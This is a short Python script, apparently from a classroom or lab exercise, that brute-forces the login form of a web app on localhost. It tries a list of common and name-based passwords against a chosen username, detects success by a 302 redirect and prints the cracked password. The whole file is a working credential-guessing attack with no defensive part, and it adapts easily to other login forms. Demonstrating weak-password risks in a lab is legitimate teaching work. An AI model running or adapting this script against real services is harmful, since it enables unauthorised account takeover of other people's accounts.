import sys, time, requests

BASE = "http://127.0.0.1:5000"

passwords = ["123456", "password", "admin", "qwerty", "111111",
             "iloveyou", "000000", "welcome", "monkey", "abc123",
             "habiba123", "youssef123", "alyaa123", "admin123"]

username = sys.argv[1] if len(sys.argv) > 1 else "habiba"

print(f"Brute-forcing account: {username}")
session = requests.Session()
found = None

for i, pw in enumerate(passwords, 1):
    r = session.post(f"{BASE}/login",
                     data={"username": username, "password": pw},
                     allow_redirects=False)
    if r.status_code == 302:        # login worked
        print(f"[{i}] trying '{pw}' ... SUCCESS")
        found = pw
        break
    else:
        print(f"[{i}] trying '{pw}' ... fail")
    time.sleep(0.05)

print("-" * 40)
if found:
    print(f"PASSWORD CRACKED: {found}")
else:
    print("Password not found in list.")